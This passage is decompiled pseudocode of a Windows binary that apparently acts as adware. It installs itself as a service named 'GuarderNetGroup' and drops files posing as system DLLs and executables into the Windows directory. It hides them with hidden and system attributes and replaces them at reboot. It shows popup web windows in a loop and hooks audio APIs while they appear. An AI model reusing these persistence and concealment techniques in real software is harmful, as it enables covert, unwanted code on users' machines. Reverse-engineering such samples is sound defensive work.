  }
  if (param_2 == 0) {
    iVar1 = WSASocketA(2,1,6,0,0,1);
    *(int *)(param_1 + 8) = iVar1;
    if (iVar1 == -1) {
      *(undefined4 *)(param_1 + 8) = 0;
      return 0;
    }
    FUN_004082de(iVar1);
  }
  else {
    *(int *)(param_1 + 8) = param_2;
  }
  return 1;
}



undefined4 FUN_004082de(undefined4 param_1)

{
  int iVar1;
  undefined4 uVar2;
  undefined4 local_20;
  undefined4 local_1c;
  undefined4 uStack_18;
  undefined4 local_14;
  undefined4 local_10;
  undefined4 local_c;
  undefined4 local_8;
  
  local_20 = 0;
  local_1c = 0;
  uStack_18 = 0;
  uVar2 = 0;
  local_8 = 0;
  local_14 = 1;
  local_c = 1000;
  local_10 = 30000;
  iVar1 = WSAIoctl(param_1,0x98000004,&local_14,0xc,&local_20,0xc,&local_8,0,0);
  if (iVar1 == -1) {
    uVar2 = Ordinal_111();
  }
  return uVar2;
}



bool FUN_00408348(int param_1,int param_2)

{
  int *piVar1;
  int iVar2;
  SOCKET sAcceptSocket;
  LPOVERLAPPED lpOverlapped;
  BOOL BVar3;
  DWORD local_c;
  DWORD local_8;
  
  iVar2 = param_1;
  local_8 = 0;
  local_c = 0;
  if (*(int *)(param_1 + 0x18) == 0) {
    SetLastError(1);
    return false;
  }
  if (param_2 < 1) {
    param_2 = *(int *)(param_1 + 0x10);
  }
  if (*(int *)(param_1 + 0x18) < *(int *)(param_1 + 0x1c) + *(int *)(param_1 + 0x14) + param_2) {
    local_8 = 0x57;
  }
  else {
    param_1 = 0;
    if (param_2 < 1) goto LAB_0040845c;
    do {
      sAcceptSocket = WSASocketA(2,1,6,0,0,1);
      if (sAcceptSocket == 0xffffffff) {
        local_8 = Ordinal_111();
        Ordinal_3(0xffffffff);
        break;
      }
      lpOverlapped = (LPOVERLAPPED)operator_new(0x60);
      memset(lpOverlapped,0,0x60);
      lpOverlapped[1].Internal = 1;
      lpOverlapped[1].InternalHigh = sAcceptSocket;
      FUN_004082de(sAcceptSocket);
      local_c = 0;
      BVar3 = AcceptEx(*(SOCKET *)(iVar2 + 8),sAcceptSocket,(PVOID)((int)&lpOverlapped[1].u + 4),0,
                       0x20,0x20,&local_c,lpOverlapped);
      if (BVar3 == 0) {
        local_8 = Ordinal_111();
        if (local_8 == 0x3e5) {
          local_8 = 0;
        }
        else {
          operator_delete(lpOverlapped);
        }
      }
      piVar1 = (int *)(iVar2 + 0x14);
      *piVar1 = *piVar1 + 1;
      param_1 = param_1 + 1;
    } while (param_1 < param_2);
    if (local_8 == 0) goto LAB_0040845c;
  }
  SetLastError(local_8);
LAB_0040845c:
  return local_8 == 0;
}



undefined4 FUN_0040846a(uint *param_1,int param_2,void *param_3)

{
  bool bVar1;
  uint uVar2;
  uint *puVar3;
  uint *puVar4;
  int iVar5;
  undefined3 extraout_var;
  DWORD DVar6;
  undefined4 uVar7;
  uint uVar8;
  uint uVar9;
  int local_18;
  int local_14;
  sockaddr *local_10;
  sockaddr *local_c;
  int *local_8;
  
  local_10 = (sockaddr *)0x0;
  local_c = (sockaddr *)0x0;
  local_18 = 0;
  local_14 = 0;
  if ((param_1[6] == 0) || (param_3 == (void *)0x0)) {
    SetLastError(1);
LAB_004085fe:
    uVar7 = 0;
  }
  else {
    if (param_2 == 0) {
      param_1[5] = param_1[5] - 1;
      uVar8 = param_1[5];
      if ((int)uVar8 <= (int)param_1[4] / 2) {
        if ((int)(param_1[7] + uVar8) < (int)param_1[6]) {
          uVar9 = param_1[6] - param_1[7];
          uVar2 = param_1[4];
          if ((int)uVar9 < (int)param_1[4]) {
            uVar2 = uVar9;
          }
          if (0 < (int)(uVar2 - uVar8)) {
            FUN_00408348((int)param_1,uVar2 - uVar8);
          }
        }
      }
      GetAcceptExSockaddrs
                ((PVOID)((int)param_3 + 0x20),*(DWORD *)((int)param_3 + 0x1c),0x20,0x20,&local_10,
                 &local_18,&local_c,&local_14);
      puVar3 = (uint *)FUN_00407a0f((int)local_8);
      if (puVar3 != (uint *)0x0) {
        puVar4 = FUN_00407cd7(local_8,(uint)puVar3);
        *(undefined2 *)(puVar4 + 3) = *(undefined2 *)(param_1 + 3);
        puVar4[1] = *param_1;
        iVar5 = FUN_00408274((int)puVar4,*(int *)((int)param_3 + 0x18),0,0,0);
        if (iVar5 != 0) {
          iVar5 = (**(code **)*local_8)(*param_1,puVar3,local_10,local_c);
          if (iVar5 == 0) {
            FUN_00407d47(local_8,puVar3);
          }
          else {
            bVar1 = FUN_00408629(puVar4,1);
            if (CONCAT31(extraout_var,bVar1) != 0) {
              param_1[7] = param_1[7] + 1;
              goto LAB_004085c8;
            }
            iVar5 = *local_8;
            DVar6 = GetLastError();
            (**(code **)(iVar5 + 4))(puVar3,DVar6);
            FUN_00407d47(local_8,puVar3);
          }
          FUN_00407b65(local_8,(uint)puVar3);
          operator_delete(param_3);
          goto LAB_004085fe;
        }
        FUN_00407d47(local_8,puVar3);
        FUN_00407b65(local_8,(uint)puVar3);
        operator_delete(param_3);
LAB_004085c8:
        FUN_00407d47(local_8,puVar3);
      }
      operator_delete(param_3);
    }
    else {
      param_1[5] = param_1[5] - 1;
      Ordinal_3(*(undefined4 *)((int)param_3 + 0x18));
      operator_delete(param_3);
      if (param_1[5] == 0) {
        if (param_2 == 0x3e3) goto LAB_004085fe;
        uVar8 = param_1[6] - param_1[7];
        if ((int)param_1[4] <= (int)(param_1[6] - param_1[7])) {
          uVar8 = param_1[4];
        }
        if (0 < (int)uVar8) {
          FUN_00408348((int)param_1,uVar8);
        }
      }
    }
    uVar7 = 1;
  }
  return uVar7;
}



bool FUN_00408629(ULONG_PTR *param_1,int param_2)

{
  void *_Dst;
  int iVar1;
  DWORD dwErrCode;
  undefined4 local_14;
  undefined4 local_10;
  int local_c;
  DWORD local_8;
  
  local_8 = 0;
  local_14 = 0;
  local_10 = 0;
  if (param_1[10] != 0) {
    dwErrCode = 0x4df;
LAB_00408664:
    SetLastError(dwErrCode);
    return false;
  }
  _Dst = operator_new(0x8024);
  param_1[10] = (ULONG_PTR)_Dst;
  if (_Dst == (void *)0x0) {
    dwErrCode = 0xe;
    goto LAB_00408664;
  }
  memset(_Dst,0,0x8024);
  *(undefined4 *)(param_1[10] + 0x14) = 3;
  *(ULONG_PTR *)(param_1[10] + 0x801c) = param_1[10] + 0x18;
  *(undefined4 *)(param_1[10] + 0x8018) = 0x8000;
  if (param_2 != 0) {
    CreateIoCompletionPort((HANDLE)param_1[2],*(HANDLE *)(local_c + 8),*param_1,0);
  }
  iVar1 = WSARecv(param_1[2],param_1[10] + 0x8018,1,&local_14,&local_10,param_1[10],0);
  if (iVar1 == -1) {
    local_8 = Ordinal_111();
    if (local_8 == 0x3e5) {
      local_8 = 0;
    }
    if (local_8 != 0) {
      SetLastError(local_8);
      goto LAB_0040870a;
    }
  }
  param_1[0x10] = param_1[0x10] + 1;
  FUN_004082de(param_1[2]);
LAB_0040870a:
  return local_8 == 0;
}



bool __thiscall FUN_00408719(void *this,undefined4 *param_1,undefined4 param_2)

{
  int iVar1;
  DWORD dwErrCode;
  undefined4 local_c;
  undefined4 local_8;
  
  dwErrCode = 0;
  local_c = 0;
  local_8 = 0;
  if (param_1[10] == 0) {
    SetLastError(0x45a);
    return false;
  }
                    // WARNING: Load size is inaccurate
  (**(code **)(*this + 8))(*param_1,param_2,param_1[10] + 0x18);
  memset((void *)param_1[10],0,0x14);
  *(undefined4 *)(param_1[10] + 0x14) = 3;
  *(int *)(param_1[10] + 0x801c) = param_1[10] + 0x18;
  *(undefined4 *)(param_1[10] + 0x8018) = 0x8000;
  iVar1 = WSARecv(param_1[2],param_1[10] + 0x8018,1,&local_c,&local_8,param_1[10],0);
  if (iVar1 == -1) {
    dwErrCode = Ordinal_111();
    if (dwErrCode == 0x3e5) {
      dwErrCode = 0;
    }
    if (dwErrCode != 0) {
      SetLastError(dwErrCode);
      goto LAB_004087ca;
    }
  }
  param_1[0x10] = param_1[0x10] + 1;
LAB_004087ca:
  return dwErrCode == 0;
}



void __thiscall FUN_004087d7(void *this,uint param_1,uint param_2,uint param_3)

{
  uint *puVar1;
  
  if (param_1 != 0) {
    EnterCriticalSection((LPCRITICAL_SECTION)((int)this + 0x30));
    if ((((int)(param_1 & 0xffff) < *(int *)((int)this + 0x48)) &&
        (puVar1 = *(uint **)(*(int *)((int)this + 0x54) + 0x18 + (param_1 & 0xffff) * 0x1c),
        puVar1 != (uint *)0x0)) && (*puVar1 == param_1)) {
      puVar1[8] = param_2;
      puVar1[9] = param_3;
    }
    LeaveCriticalSection((LPCRITICAL_SECTION)((int)this + 0x30));
  }
  return;
}



undefined8 __thiscall FUN_0040882a(void *this,uint param_1)

{
  uint *puVar1;
  uint uVar2;
  uint uVar3;
  
  if (param_1 == 0) {
    uVar2 = 0;
    uVar3 = 0;
  }
  else {
    EnterCriticalSection((LPCRITICAL_SECTION)((int)this + 0x30));
    if ((((int)(param_1 & 0xffff) < *(int *)((int)this + 0x48)) &&
        (puVar1 = *(uint **)(*(int *)((int)this + 0x54) + 0x18 + (param_1 & 0xffff) * 0x1c),
        puVar1 != (uint *)0x0)) && (*puVar1 == param_1)) {
      uVar2 = puVar1[8];
      uVar3 = puVar1[9];
    }
    else {
      uVar2 = 0;
      uVar3 = 0;
    }
    LeaveCriticalSection((LPCRITICAL_SECTION)((int)this + 0x30));
  }
  return CONCAT44(uVar3,uVar2);
}



undefined4 * FUN_00408893(void)

{
  undefined4 *this;
  undefined4 *puVar1;
  int unaff_EBP;
  
  FUN_0040a1d0();
  this = (undefined4 *)operator_new(0x40);
  *(undefined4 **)(unaff_EBP + -0x10) = this;
  *(undefined4 *)(unaff_EBP + -4) = 0;
  puVar1 = (undefined4 *)0x0;
  if (this != (undefined4 *)0x0) {
    CWnd::CWnd((CWnd *)this);
    *this = &PTR_LAB_0040bf00;
    puVar1 = this;
  }
  ExceptionList = *(void **)(unaff_EBP + -0xc);
  return puVar1;
}



void __thiscall
FUN_004088d1(void *this,undefined4 param_1,char *param_2,ulong param_3,tagRECT *param_4,
            CWnd *param_5,uint param_6)

{
  CWnd::CreateControl((CWnd *)this,(_GUID *)&DAT_0040bfc0,param_2,param_3,param_4,param_5,param_6,
                      (CFile *)0x0,0,(ushort *)0x0);
  return;
}



CWnd * __thiscall FUN_004088f6(void *this,byte param_1)

{
  CWnd::~CWnd((CWnd *)this);
  if ((param_1 & 1) != 0) {
    operator_delete(this);
  }
  return (CWnd *)this;
}



void __thiscall CWnd::~CWnd(CWnd *this)

{
  ~CWnd(this);
  return;
}



void __fastcall
FUN_00408923(CWnd *param_1,undefined param_2,undefined4 param_3,undefined4 param_4,
            undefined4 param_5,undefined4 param_6,undefined4 param_7)

{
  CWnd::InvokeHelper(param_1,(long)param_1,0x68,1,(void *)0x0,(uchar *)0x0);
  return;
}



void __fastcall FUN_0040894f(CWnd *param_1)

{
  CWnd::InvokeHelper(param_1,(long)param_1,0x6a,1,(void *)0x0,(uchar *)0x0);
  return;
}



CWnd * __fastcall FUN_00408962(CWnd *param_1)

{
  CWnd *local_8;
  
  local_8 = param_1;
  CWnd::InvokeHelper(param_1,(long)param_1,200,2,(void *)0x9,(uchar *)&local_8);
  return local_8;
}



void __fastcall FUN_00408983(CWnd *param_1,undefined param_2,undefined4 param_3)

{
  CWnd::InvokeHelper(param_1,(long)param_1,0x227,4,(void *)0x0,(uchar *)0x0);
  return;
}



void FUN_004089a3(void *param_1)

{
  operator_delete(param_1);
  return;
}



undefined4 * FUN_004089bc(void)

{
  undefined4 *this;
  int unaff_EBP;
  
  FUN_0040a1d0();
  *(undefined4 **)(unaff_EBP + -0x10) = this;
  CWinApp::CWinApp((CWinApp *)this,(char *)0x0);
  *(undefined4 *)(unaff_EBP + -4) = 0;
  FUN_00404e69();
  *(undefined *)(unaff_EBP + -4) = 1;
  CString::CString((CString *)(this + 0x5d));
  *(undefined *)(unaff_EBP + -4) = 2;
  CString::CString((CString *)(this + 0x5e));
  *(undefined *)(unaff_EBP + -4) = 3;
  CString::CString((CString *)(this + 0x5f));
  ExceptionList = *(void **)(unaff_EBP + -0xc);
  this[0x60] = 0;
  *this = &PTR_LAB_0040c008;
  return this;
}



void * __thiscall FUN_00408a2c(void *this,byte param_1)

{
  FUN_00408a48();
  if ((param_1 & 1) != 0) {
    operator_delete(this);
  }
  return this;
}



void FUN_00408a48(void)

{
  CWinApp *this;
  int unaff_EBP;
  
  FUN_0040a1d0();
  *(CWinApp **)(unaff_EBP + -0x10) = this;
  *(undefined4 *)(unaff_EBP + -4) = 3;
  CString::~CString((CString *)(this + 0x17c));
  *(undefined *)(unaff_EBP + -4) = 2;
  CString::~CString((CString *)(this + 0x178));
  *(undefined *)(unaff_EBP + -4) = 1;
  CString::~CString((CString *)(this + 0x174));
  *(undefined *)(unaff_EBP + -4) = 0;
  FUN_00404ee8();
  *(undefined4 *)(unaff_EBP + -4) = 0xffffffff;
  CWinApp::~CWinApp(this);
  ExceptionList = *(void **)(unaff_EBP + -0xc);
  return;
}



void FUN_00408aba(void)

{
  FUN_004089bc();
  return;
}



void FUN_00408ac4(void)

{
  FUN_0040a286((_onexit_t)&LAB_00408ad0);
  return;
}



void FUN_00408ae4(void)

{
  FUN_00402d9c((undefined4 *)&DAT_0040ee80);
  return;
}



void FUN_00408aee(void)

{
  FUN_0040a286((_onexit_t)&LAB_00408afa);
  return;
}



void FUN_00408b0e(void)

{
  FUN_00402d9c((undefined4 *)&DAT_0040ee50);
  return;
}



void FUN_00408b18(void)

{
  FUN_0040a286((_onexit_t)&LAB_00408b24);
  return;
}



void FUN_00408b38(void)

{
  FUN_00402d9c((undefined4 *)&DAT_0040ee20);
  return;
}



void FUN_00408b42(void)

{
  FUN_0040a286((_onexit_t)&LAB_00408b4e);
  return;
}



void FUN_00408b62(void)

{
  FUN_00402d9c((undefined4 *)&DAT_0040edf0);
  return;
}



void FUN_00408b6c(void)

{
  FUN_0040a286((_onexit_t)&LAB_00408b78);
  return;
}



undefined4 FUN_00408b97(void)

{
  HMODULE hModule;
  bool bVar1;
  undefined3 extraout_var;
  LPSTR _Str;
  char *pcVar2;
  size_t sVar3;
  char *pcVar4;
  HANDLE pvVar5;
  DWORD DVar6;
  int extraout_ECX;
  int iVar7;
  int unaff_EBP;
  undefined4 *puVar8;
  
  FUN_0040a1d0();
  FUN_00404e69();
  *(undefined *)(unaff_EBP + -0x2d0) = 0;
  puVar8 = (undefined4 *)(unaff_EBP + -0x2cf);
  for (iVar7 = 0x7f; iVar7 != 0; iVar7 = iVar7 + -1) {
    *puVar8 = 0;
    puVar8 = puVar8 + 1;
  }
  *(undefined2 *)puVar8 = 0;
  *(undefined *)((int)puVar8 + 2) = 0;
  *(undefined4 *)(unaff_EBP + -4) = 0;
  hModule = DAT_0040ef1c;
  *(undefined4 *)(unaff_EBP + -0x10) = 0;
  GetModuleFileNameA(hModule,(LPSTR)(unaff_EBP + -0x2d0),0x200);
  bVar1 = FUN_004051ff((void *)(unaff_EBP + -0xd0),(LPCSTR)(unaff_EBP + -0x2d0),0);
  if (CONCAT31(extraout_var,bVar1) == 0) {
    pvVar5 = CreateMutexA((LPSECURITY_ATTRIBUTES)0x0,0,s_PopupWebMutex_Option_0040e7e8);
    *(HANDLE *)(unaff_EBP + -0x10) = pvVar5;
    DVar6 = GetLastError();
    if (DVar6 != 0xb7) {
      CString::operator=((CString *)(extraout_ECX + 0x178),(char *)(unaff_EBP + -0x2d0));
      pcVar4 = s_PopOpt_dat_0040e7dc;
      pcVar2 = strrchr((char *)(unaff_EBP + -0x2d0),0x5c);
      strcpy(pcVar2 + 1,pcVar4);
      CString::operator=((CString *)(extraout_ECX + 0x17c),(char *)(unaff_EBP + -0x2d0));
      pcVar4 = s_webpop_dll_0040e7d0;
      pcVar2 = strrchr((char *)(unaff_EBP + -0x2d0),0x5c);
      strcpy(pcVar2 + 1,pcVar4);
      CString::operator=((CString *)(extraout_ECX + 0x174),(char *)(unaff_EBP + -0x2d0));
      DVar6 = GetFileAttributesA((LPCSTR)(unaff_EBP + -0x2d0));
      if (DVar6 != 0xffffffff) {
        FUN_00401000();
        *(undefined *)(unaff_EBP + -4) = 2;
        *(int *)(extraout_ECX + 0x20) = unaff_EBP + -0x468;
        CDialog::DoModal((CDialog *)(unaff_EBP + -0x468));
        *(undefined *)(unaff_EBP + -4) = 0;
        FUN_00401179();
      }
    }
  }
  else {
    _Str = GetCommandLineA();
    pcVar2 = strrchr(_Str,0x20);
    if (pcVar2 != (char *)0x0) {
      sVar3 = strlen(pcVar2);
      if (sVar3 != 0) {
        pcVar4 = strchr(pcVar2,0x22);
        if (pcVar4 != (char *)0x0) goto LAB_00408d2c;
        pcVar2 = pcVar2 + 1;
      }
      if (pcVar2 != (char *)0x0) {
        sVar3 = strlen(pcVar2);
        if (sVar3 != 0) {
          iVar7 = _stricmp(pcVar2,s__Service_0040e840);
          if (iVar7 == 0) {
            *(undefined4 *)(unaff_EBP + -0x18) = 0;
            *(undefined4 *)(unaff_EBP + -0x14) = 0;
            *(char **)(unaff_EBP + -0x20) = s_GuarderNetGroup_0040e830;
            *(code **)(unaff_EBP + -0x1c) = FUN_004093d3;
            StartServiceCtrlDispatcherA((SERVICE_TABLE_ENTRYA *)(unaff_EBP + -0x20));
            goto LAB_00408e27;
          }
          iVar7 = _stricmp(pcVar2,s__Popup_0040e828);
          if (iVar7 == 0) {
            pvVar5 = CreateMutexA((LPSECURITY_ATTRIBUTES)0x0,0,s_PopupWebMutex_0040e818);
            *(HANDLE *)(unaff_EBP + -0x10) = pvVar5;
            DVar6 = GetLastError();
            if (DVar6 != 0xb7) {
              FUN_004091aa();
            }
          }
          else {
            iVar7 = _stricmp(pcVar2,s__Uninstall_0040e80c);
            if (iVar7 == 0) {
              FUN_0040657f(unaff_EBP + -0x10);
              *(undefined *)(unaff_EBP + -4) = 1;
              FUN_00407180(s_GuarderNetGroup_0040e830,(char *)0x0,(void *)0x0,1);
              FUN_00406b41((uchar *)s_GuarderNetGroup_0040e830,(char *)0x0,0);
              *(undefined *)(unaff_EBP + -4) = 0;
              FUN_00402dd9();
              goto LAB_00408e27;
            }
            _stricmp(pcVar2,s__Install_0040e800);
          }
          goto LAB_00408e18;
        }
      }
    }
LAB_00408d2c:
    FUN_00408e47();
  }
LAB_00408e18:
  if (*(int *)(unaff_EBP + -0x10) != 0) {
    CloseHandle(*(HANDLE *)(unaff_EBP + -0x10));
  }
LAB_00408e27:
  *(undefined4 *)(unaff_EBP + -4) = 0xffffffff;
  FUN_00404ee8();
  ExceptionList = *(void **)(unaff_EBP + -0xc);
  return 0;
}



void FUN_00408e47(void)

{
  void *this;
  HMODULE hModule;
  size_t sVar1;
  char *pcVar2;
  DWORD DVar3;
  int iVar4;
  int unaff_EBP;
  undefined4 *puVar5;
  
  FUN_0040a1d0();
  *(undefined *)(unaff_EBP + -0x3d4) = 0;
  puVar5 = (undefined4 *)(unaff_EBP + -0x3d3);
  for (iVar4 = 0x40; iVar4 != 0; iVar4 = iVar4 + -1) {
    *puVar5 = 0;
    puVar5 = puVar5 + 1;
  }
  *(undefined2 *)puVar5 = 0;
  *(undefined *)((int)puVar5 + 2) = 0;
  *(undefined *)(unaff_EBP + -0x11c) = 0;
  puVar5 = (undefined4 *)(unaff_EBP + -0x11b);
  for (iVar4 = 0x40; iVar4 != 0; iVar4 = iVar4 + -1) {
    *puVar5 = 0;
    puVar5 = puVar5 + 1;
  }
  *(undefined2 *)puVar5 = 0;
  *(undefined *)((int)puVar5 + 2) = 0;
  *(undefined *)(unaff_EBP + -0x2d0) = 0;
  *(undefined4 *)(unaff_EBP + -0x18) = 0;
  puVar5 = (undefined4 *)(unaff_EBP + -0x2cf);
  for (iVar4 = 0x40; iVar4 != 0; iVar4 = iVar4 + -1) {
    *puVar5 = 0;
    puVar5 = puVar5 + 1;
  }
  *(undefined2 *)puVar5 = 0;
  *(undefined4 *)(unaff_EBP + -0x14) = 0;
  *(undefined *)((int)puVar5 + 2) = 0;
  FUN_00404e69();
  hModule = DAT_0040ef1c;
  *(undefined4 *)(unaff_EBP + -4) = 0;
  GetModuleFileNameA(hModule,(LPSTR)(unaff_EBP + -0x3d4),0x104);
  FUN_004051ff((void *)(unaff_EBP + -0x1cc),(LPCSTR)(unaff_EBP + -0x3d4),1);
  GetWindowsDirectoryA((LPSTR)(unaff_EBP + -0x11c),0x104);
  sVar1 = strlen((char *)(unaff_EBP + -0x11c));
  if (*(char *)(unaff_EBP + -0x11d + sVar1) != '\\') {
    strcat((char *)(unaff_EBP + -0x11c),&DAT_0040e654);
  }
  this = *(void **)(unaff_EBP + 8);
  if (*(short *)((int)this + 0xa2) != 0) {
    pcVar2 = strrchr((char *)(unaff_EBP + -0x11c),0x5c);
    *pcVar2 = '\0';
    strcat((char *)(unaff_EBP + -0x11c),s__ws2help_dll_0040e878);
    iVar4 = FUN_004054b0(this,(LPCSTR)(unaff_EBP + -0x11c),1,*(LPCVOID *)((int)this + 0xa8),
                         *(uint *)((int)this + 0xac));
    if (iVar4 == 0) {
      strcpy((char *)(unaff_EBP + -0x2d0),(char *)(unaff_EBP + -0x11c));
      strcat((char *)(unaff_EBP + -0x2d0),&DAT_0040e64c);
      iVar4 = FUN_004054b0(this,(LPCSTR)(unaff_EBP + -0x2d0),1,*(LPCVOID *)((int)this + 0xa8),
                           *(uint *)((int)this + 0xac));
      if (iVar4 != 0) {
        SetFileAttributesA((LPCSTR)(unaff_EBP + -0x2d0),7);
        MoveFileExA((LPCSTR)(unaff_EBP + -0x2d0),(LPCSTR)(unaff_EBP + -0x11c),4);
      }
    }
    else {
      SetFileAttributesA((LPCSTR)(unaff_EBP + -0x11c),7);
    }
  }
  FUN_0040657f(unaff_EBP + -0x10);
  iVar4 = *(int *)((int)this + 0x84);
  *(undefined *)(unaff_EBP + -4) = 1;
  if (iVar4 != 0) {
    pcVar2 = strrchr((char *)(unaff_EBP + -0x11c),0x5c);
    *pcVar2 = '\0';
    strcat((char *)(unaff_EBP + -0x11c),s__servbrow_exe_0040e868);
    *(undefined4 *)(unaff_EBP + -0x134) = *(undefined4 *)(unaff_EBP + -0x138);
    SetFileAttributesA((LPCSTR)(unaff_EBP + -0x3d4),0x80);
    iVar4 = FUN_004054b0((void *)(unaff_EBP + -0x1cc),(LPCSTR)(unaff_EBP + -0x11c),0,
                         *(LPCVOID *)(unaff_EBP + -0x124),*(uint *)(unaff_EBP + -0x120));
    if (iVar4 == 0) {
      strcpy((char *)(unaff_EBP + -0x2d0),(char *)(unaff_EBP + -0x11c));
      strcat((char *)(unaff_EBP + -0x2d0),&DAT_0040e64c);
      FUN_004054b0((void *)(unaff_EBP + -0x1cc),(LPCSTR)(unaff_EBP + -0x2d0),0,
                   *(LPCVOID *)(unaff_EBP + -0x124),*(uint *)(unaff_EBP + -0x120));
      MoveFileExA((LPCSTR)(unaff_EBP + -0x2d0),(LPCSTR)(unaff_EBP + -0x11c),4);
    }
    iVar4 = FUN_00407289(s_GuarderNetGroup_0040e830,(char *)0x0);
    if (iVar4 == 0) {
      sprintf((char *)(unaff_EBP + -0x2d0),s___s___Service_0040e858,unaff_EBP + -0x11c);
      DVar3 = FUN_004069ca(s_GuarderNetGroup_0040e830,s_GuarderNetGroup_0040e830,
                           s_GuarderNetGroup_0040e830,(char *)(unaff_EBP + -0x2d0),2,0x10,
                           (char *)0x0,(char *)0x0);
      if (DVar3 == 0) {
        *(undefined4 *)(unaff_EBP + -0x14) = 1;
        FUN_004070ae(s_GuarderNetGroup_0040e830,(char *)0x0,(LPSERVICE_STATUS)0x0,0,(LPCSTR *)0x0);
        OutputDebugStringA(&DAT_0040e854);
      }
    }
    else {
      FUN_004070ae(s_GuarderNetGroup_0040e830,(char *)0x0,(LPSERVICE_STATUS)0x0,0,(LPCSTR *)0x0);
    }
  }
  iVar4 = FUN_0040616c(this,(int *)(unaff_EBP + -0x18));
  if (iVar4 == 0) {
    if ((*(int *)(unaff_EBP + -0x18) != 0) && (*(int *)((int)this + 0x84) == 0)) {
      *(undefined4 *)(unaff_EBP + -0x14) = 1;
      OutputDebugStringA(&DAT_0040e850);
    }
    if (*(int *)(unaff_EBP + -0x14) != 0) {
      OutputDebugStringA(&DAT_0040e84c);
      FUN_004060cd((int)this);
    }
  }
  *(undefined *)(unaff_EBP + -4) = 0;
  FUN_00402dd9();
  *(undefined4 *)(unaff_EBP + -4) = 0xffffffff;
  FUN_00404ee8();
  ExceptionList = *(void **)(unaff_EBP + -0xc);
  return;
}



void FUN_004091aa(void)

{
  int iVar1;
  int iVar2;
  int unaff_EBP;
  
  FUN_0040a1d0();
  AfxEnableControlContainer((COccManager *)0x0);
  OleInitialize((LPVOID)0x0);
  FUN_00409ab2();
  iVar2 = DAT_0040f030;
  iVar1 = *(int *)(unaff_EBP + 8);
  *(undefined4 *)(unaff_EBP + -4) = 0;
  while ((iVar2 == 0 && (iVar2 = FUN_00405460(iVar1), iVar2 == 0))) {
    Sleep(60000);
    iVar2 = DAT_0040f030;
  }
  FUN_0040536b(iVar1);
  *(undefined4 *)(unaff_EBP + -0x114) = *(undefined4 *)(iVar1 + 0x90);
  *(undefined4 *)(unaff_EBP + -0x118) = *(undefined4 *)(iVar1 + 0x9c);
  iVar2 = FUN_00405978();
  if (iVar2 != 0) {
    FUN_0040581e(iVar1);
  }
  while (DAT_0040f030 == 0) {
    iVar2 = FUN_00405b84();
    *(int *)(unaff_EBP + 8) = iVar2;
    if (iVar2 != 0) {
      while ((DAT_0040f030 == 0 && (iVar2 = FUN_00405460(iVar1), iVar2 == 0))) {
        Sleep(60000);
      }
      CString::operator=((CString *)(unaff_EBP + -0x11c),*(char **)(unaff_EBP + 8));
      if (*(short *)(iVar1 + 0xa0) != 0) {
        FUN_00409334(1);
      }
      CDialog::DoModal((CDialog *)(unaff_EBP + -0x1c0));
      FUN_00405ecf(*(byte **)(unaff_EBP + 8));
      if (*(short *)(iVar1 + 0xa0) != 0) {
        FUN_00409334(0);
      }
      Sleep(25000);
    }
    Sleep(2000);
  }
  *(undefined4 *)(unaff_EBP + -4) = 0xffffffff;
  FUN_004092ed();
  ExceptionList = *(void **)(unaff_EBP + -0xc);
  return;
}



void FUN_004092ed(void)

{
  CDialog *this;
  int unaff_EBP;
  
  FUN_0040a1d0();
  *(CDialog **)(unaff_EBP + -0x10) = this;
  *(undefined4 *)(unaff_EBP + -4) = 1;
  CString::~CString((CString *)(this + 0xa4));
  *(undefined *)(unaff_EBP + -4) = 0;
  CWnd::~CWnd((CWnd *)(this + 0x60));
  *(undefined4 *)(unaff_EBP + -4) = 0xffffffff;
  CDialog::~CDialog(this);
  ExceptionList = *(void **)(unaff_EBP + -0xc);
  return;
}



void FUN_00409334(int param_1)

{
  if (param_1 == 0) {
    FUN_00403159((char **)&DAT_0040ee80);
    FUN_00403159((char **)&DAT_0040ee50);
    FUN_00403159((char **)&DAT_0040ee20);
    FUN_00403159((char **)&DAT_0040edf0);
  }
  else {
    FUN_00402dda(&DAT_0040ee80,s_Winmm_dll_0040e8dc,s_waveOutWrite_0040e8e8,0x408b82,1);
    FUN_00402dda(&DAT_0040ee50,s_dsound_dll_0040e8d0,s_DirectSoundCreate_0040e8bc,0x408b87,1);
    FUN_00402dda(&DAT_0040ee20,s_dsound_dll_0040e8d0,s_DirectSoundCreate8_0040e8a8,0x408b87,1);
    FUN_00402dda(&DAT_0040edf0,s_mf_dll_0040e888,s_MFCreateAudioRenderer_0040e890,0x408b8f,1);
  }
  return;
}



void FUN_004093d3(void)

{
  DWORD dwProcessId;
  BOOL BVar1;
  int iVar2;
  int unaff_EBP;
  undefined4 *puVar3;
  DWORD *pSessionId;
  
  FUN_0040a1d0();
  FUN_0040657f(unaff_EBP + -0x18);
  *(undefined4 *)(unaff_EBP + -4) = 0;
  DAT_0040f034 = RegisterServiceCtrlHandlerA
                           (s_GuarderNetGroup_0040e830,(LPHANDLER_FUNCTION)&LAB_004095d7);
  if (DAT_0040f034 == (SERVICE_STATUS_HANDLE)0x0) {
    GetLastError();
    *(undefined4 *)(unaff_EBP + -4) = 0xffffffff;
    FUN_00402dd9();
  }
  else {
    FUN_00409572(2,0,1);
    DAT_0040f038 = CreateEventA((LPSECURITY_ATTRIBUTES)0x0,1,0,(LPCSTR)0x0);
    FUN_00409572(4,0,0);
    *(undefined *)(unaff_EBP + -0x120) = 0;
    *(undefined *)(unaff_EBP + -0x24c) = 0;
    *(undefined4 *)(unaff_EBP + -0x10) = 0xffffffff;
    puVar3 = (undefined4 *)(unaff_EBP + -0x11f);
    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {
      *puVar3 = 0;
      puVar3 = puVar3 + 1;
    }
    *(undefined2 *)puVar3 = 0;
    *(undefined *)((int)puVar3 + 2) = 0;
    puVar3 = (undefined4 *)(unaff_EBP + -0x24b);
    for (iVar2 = 0x4a; iVar2 != 0; iVar2 = iVar2 + -1) {
      *puVar3 = 0;
      puVar3 = puVar3 + 1;
    }
    *(undefined2 *)puVar3 = 0;
    *(undefined *)((int)puVar3 + 2) = 0;
    pSessionId = (DWORD *)(unaff_EBP + -0x1c);
    *(undefined4 *)(unaff_EBP + -0x1c) = 0;
    dwProcessId = GetCurrentProcessId();
    BVar1 = ProcessIdToSessionId(dwProcessId,pSessionId);
    if (BVar1 == 0) {
      *(undefined4 *)(unaff_EBP + -0x1c) = 0xffffffff;
    }
    GetModuleFileNameA((HMODULE)0x0,(LPSTR)(unaff_EBP + -0x120),0x104);
    while (DAT_0040f030 == 0) {
      iVar2 = FUN_00409652();
      *(int *)(unaff_EBP + -0x14) = iVar2;
